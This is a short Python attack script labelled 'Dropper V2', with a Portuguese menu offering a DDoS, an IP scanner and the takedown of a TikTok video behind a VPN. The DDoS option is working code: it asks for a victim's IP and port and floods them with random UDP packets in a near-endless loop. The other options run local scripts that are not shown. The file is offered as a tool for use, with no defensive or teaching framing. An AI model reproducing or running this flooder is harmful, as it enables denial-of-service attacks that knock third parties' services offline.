import socket, random, time, http.client, json, os, subprocess
from colorama import Fore, Back, Style 
startTime = time.time()

def painel():
  print(Fore.RED + """


Dropper V2
 
  
  
  """)
  print(Fore.RED + 'Developed by Arakemi')
  print('')

painel()
print('1 - DDOS \n2 - IP SCANNER \n3 - DERRUBAR VIDEO TIKTOK ( UTILIZE VPN )')
select = int(input('\nEscolha uma opção: '))

if select == 1:
  os.system('cls' if os.name == 'nt' else 'clear')
  
  print("""
   ___  ___  ____ ____ 
   |  \ |  \ |  | [__  
   |__/ |__/ |__| ___] 

  
  """)

  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
  ip = input("Ip da Vítima: ")
  port = int(input("Porta: "))
  sleep = float(input("Tempo: "))
  
  s.connect((ip, port))
  
  for i in range(1, 100**1000):
    s.send(random._urandom(10)*1000)
    print(f"Enviado: {i}", end='\r')
    time.sleep(sleep)
    

if select ==2:
  os.system('cls' if os.name == 'nt' else 'clear')

  exec(open("ipscanner.py").read())

elif select ==3:
  os.system('cls' if os.name == 'nt' else 'clear')
  
  exec(open("tiktok.py").read())

else:
  os.system('cls' if os.name == 'nt' else 'clear')
  print('Opção Invalida!')
